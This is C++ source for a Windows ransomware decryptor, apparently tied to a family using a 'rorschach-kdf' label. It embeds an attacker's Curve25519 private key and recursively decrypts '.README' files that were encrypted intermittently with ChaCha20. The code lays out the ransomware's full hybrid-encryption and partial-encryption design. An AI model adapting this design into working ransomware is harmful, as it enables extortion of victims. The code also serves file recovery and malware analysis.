#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#pragma comment(lib, "bcrypt.lib")

extern "C" {
#include "curve25519.h"
#include "chacha20.h"
}

static const uint8_t ATTACKER_PRIVATE[32] = {
    0x88,0x04,0x8F,0x20,0x2F,0xB5,0x60,0x66,0x31,0xF5,0xEC,0xE9,0x0A,0x4A,0x6D,0x57,
    0xF4,0x07,0x4A,0xDE,0x69,0x16,0xAE,0x02,0xD0,0x04,0xCF,0x04,0xD0,0xD5,0x9B,0x52
};

static void derive_session_key(
    const uint8_t* our_priv,
    const uint8_t* their_pub,
    uint8_t* key_out)
{
    uint8_t shared[32];
    curve25519_donna(shared, our_priv, their_pub);

    BCRYPT_ALG_HANDLE hAlg;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM,
                                NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    BCRYPT_HASH_HANDLE hHash;
    BCryptCreateHash(hAlg, &hHash, NULL, 0, shared, 32, 0);
    BCryptHashData(hHash, (PUCHAR)"rorschach-kdf", 13, 0);
    BCryptFinishHash(hHash, key_out, 32, 0);
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

static int decrypt_file(const wchar_t* path) {
    HANDLE hFile = CreateFileW(path,
        GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Cannot open: %s\n", path);
        return 0;
    }

    LARGE_INTEGER fs;
    GetFileSizeEx(hFile, &fs);
    SIZE_T file_size = (SIZE_T)fs.QuadPart;

    if (file_size < 45) {
        CloseHandle(hFile);
        return 0;
    }

    uint8_t nonce[12];
    uint8_t victim_pub[32];
    DWORD   read_bytes;

    SetFilePointer(hFile, (LONG)(file_size - 44), NULL, FILE_BEGIN);
    ReadFile(hFile, nonce,      12, &read_bytes, NULL);
    ReadFile(hFile, victim_pub, 32, &read_bytes, NULL);

    uint8_t session_key[32];
    derive_session_key(ATTACKER_PRIVATE, victim_pub, session_key);

    SIZE_T data_size = file_size - 44;

    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 0; }

    uint8_t* data = (uint8_t*)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0);
    if (!data) { CloseHandle(hMap); CloseHandle(hFile); return 0; }

    static const SIZE_T SMALL_FILE = 1024 * 1024;
    static const SIZE_T CHUNK_SIZE = 512  * 1024;
    static const SIZE_T SKIP_RATIO = 3;

    if (data_size <= SMALL_FILE) {
        chacha20_xor(data, data, data_size, session_key, nonce, 0);
    } else {
        SIZE_T offset = 0;
        while (offset < data_size) {
            SIZE_T remaining = data_size - offset;
            SIZE_T chunk = (remaining < CHUNK_SIZE) ? remaining : CHUNK_SIZE;
            chacha20_xor(data + offset, data + offset,
                         chunk, session_key, nonce, 0);
            offset += chunk * SKIP_RATIO;
        }
    }

    UnmapViewOfFile(data);
    CloseHandle(hMap);

    SetFilePointer(hFile, (LONG)data_size, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    CloseHandle(hFile);

    wchar_t orig[MAX_PATH];
    wcscpy_s(orig, path);
    size_t len = wcslen(orig);
    if (len > 7 && _wcsicmp(orig + len - 7, L".README") == 0)
        orig[len - 7] = L'\0';
    MoveFileW(path, orig);

    wprintf(L"[+] Decrypted: %s\n", orig);
    return 1;
}

static void enumerate_and_decrypt(const wchar_t* root) {
    wchar_t pattern[MAX_PATH];
    swprintf_s(pattern, MAX_PATH, L"%s\\*", root);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0) continue;

        wchar_t full[MAX_PATH];
        swprintf_s(full, MAX_PATH, L"%s\\%s", root, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            enumerate_and_decrypt(full);
        } else {
            size_t len = wcslen(fd.cFileName);
            if (len > 7 &&
                _wcsicmp(fd.cFileName + len - 7, L".README") == 0)
                decrypt_file(full);
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"Usage: decryptor.exe <path>\n");
        wprintf(L"Example: decryptor.exe C:\\\n");
        return 1;
    }
    enumerate_and_decrypt(argv[1]);
    wprintf(L"[*] Done.\n");
    return 0;
}
